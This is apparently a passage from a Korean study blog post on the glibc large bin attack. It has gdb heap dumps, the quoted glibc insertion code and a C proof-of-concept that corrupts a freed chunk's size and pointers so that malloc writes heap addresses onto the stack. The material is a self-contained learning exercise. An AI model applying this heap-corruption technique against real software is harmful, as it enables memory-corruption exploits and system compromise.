0x7ffff7dd3f60 <main_arena+1120>: 0x0000000000602000  0x00007ffff7dd3f58
0x7ffff7dd3f70 <main_arena+1136>: 0x00007ffff7dd3f58  0x00007ffff7dd3f68
0x7ffff7dd3f80 <main_arena+1152>: 0x00007ffff7dd3f68  0x00007ffff7dd3f78
//large bin의 첫 번째 chunk로 등록된다.
(gdb) x/8gx 0x0000000000602f90 //p11
0x602f90:   0x0000000000000000  0x0000000000000411
0x602fa0:   0x0000000000602430  0x00007ffff7dd3f48
0x602fb0:   0x0000000000602430  0x0000000000602000
0x602fc0:   0x0000000000000000  0x0000000000000000
(gdb) x/8gx 0x0000000000602430 //p3
0x602430:   0x0000000000000000  0x00000000000003f1
0x602440:   0x0000000000602870  0x0000000000602f90
0x602450:   0x0000000000602000  0x0000000000602f90
0x602460:   0x0000000000000000  0x0000000000000000
(gdb) x/8gx 0x0000000000602870 //p5
0x602870:   0x0000000000000000  0x0000000000000411
0x602880:   0x0000000000602000  0x0000000000602430
0x602890:   0x0000000000000000  0x0000000000000000
0x6028a0:   0x0000000000000000  0x0000000000000000
(gdb) x/8gx 0x0000000000602000 //p1
0x602000:   0x0000000000000000  0x0000000000000401
0x602010:   0x00007ffff7dd3f48  0x0000000000602870
0x602020:   0x0000000000602f90  0x0000000000602430
0x602030:   0x0000000000000000  0x0000000000000000
```

#### Large bin exploitation

2-3-2-2-2을 이용한다.

```c
else
{
     victim->fd_nextsize = fwd;
     victim->bk_nextsize = fwd->bk_nextsize;
     fwd->bk_nextsize = victim;
     victim->bk_nextsize->fd_nextsize = victim;
}
bck = fwd->bk;
```

이 코드를 이용하게 되는데

unsorted bin attack 과 유사하게 fwd -> bk를 fake chunk로 덮을 수 있다면 fake chunk -> fd값을 손상 시킬 수 있다. 

fd_nextsize와 bk_nextsize도 함께 이용해야 한다..

```c
#include<stdio.h>
#include<stdlib.h>
 
int main()
{
    unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12;
    unsigned long *p;
    unsigned long stack[8] = {0};
    printf("stack address: %p\n", &stack);
    p1 = malloc(0x3f0);
    p2 = malloc(0x20);
    p3 = malloc(0x400);
    p4 = malloc(0x20);
    p5 = malloc(0x400);
    p6 = malloc(0x20);
    p7 = malloc(0x120);
    p8 = malloc(0x20);
    p9 = malloc(0x140);
    p10 = malloc(0x20);
    p11 = malloc(0x400);
    p12 = malloc(0x20);
    free(p7);
    free(p9);
 
    p = malloc(0x60);
    p = malloc(0xb0);
 
    free(p1);
    free(p3);
    free(p5);
 
    p = malloc(0x60);
 
    free(p11);
 
    *(p3-1) = 0x3f1;
    *(p3) = (unsigned long)(&stack);
    *(p3+1) = (unsigned long)(&stack);
    *(p3+2) = (unsigned long)(&stack);
    *(p3+3) = (unsigned long)(&stack);
    // trigger malicious malloc
    p = malloc(0x60);
 
    return 0;
}
```

익스 예제 코드

메모리를 손상시킬 수 있다고 하면 large bin의 첫 번째 chunk 크기를 0x3f1로 변조하고 fd,bk,fd_nextsize,bk_nextsize를 스택 주소로 변조한다.

```c
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x6037e0 (size : 0x1f820)
       last_remainder: 0x603290 (size : 0xe0)
            unsortbin: 0x6033a0 (size : 0x410) <--> 0x603290 (size : 0xe0)
         largebin[64]: 0x602840 (size : 0x410) <--> 0x602c80 (size : 0x410) <--> 0x602410 (size : 0x400)
```

메모리를 변조하기 전에 large bin p3이 첫 번째 chunk로 등록되어 있다.

```c
gdb-peda$ x/40gx 0x602840
0x602840:	0x0000000000000000	0x00000000000003f1
0x602850:	0x00007fffffffe460	0x00007fffffffe460
0x602860:	0x00007fffffffe460	0x00007fffffffe460
```

p3의 header 제외 모든 필드를 스택 주소로 변경

```c
gdb-peda$ x/12gx 0x7fffffffe460
0x7fffffffe460:	0x0000000000000000	0x0000000000000000
0x7fffffffe470:	0x00000000006033a0	0x0000000000000000
0x7fffffffe480:	0x00000000006033a0	0x0000000000000000

gdb-peda$ x/40gx 0x00000000006033a0
0x6033a0:	0x0000000000000000	0x0000000000000411
0x6033b0:	0x0000000000602840	0x00007fffffffe460
0x6033c0:	0x0000000000602840	0x00007fffffffe460
```

그리고 malloc..! 

으 되게 복잡하다.. 너무 연산이 많아서.. 크기 조건 잘 맞추고 split 잘 나누고 large bin에 원하는대로 쌓아주고 나서야 공격이 가능한 듯... 뭔지 감은 조금 오는데.. 아직 너무 이해가 안돼서 계속 읽어봐야 할 것 같다 ㅠ 이렇게 적어보니 그냥 그저 번역만.. 해놓은 듯하다... 더 찾아보고 분석하면서 이해해야겠다...

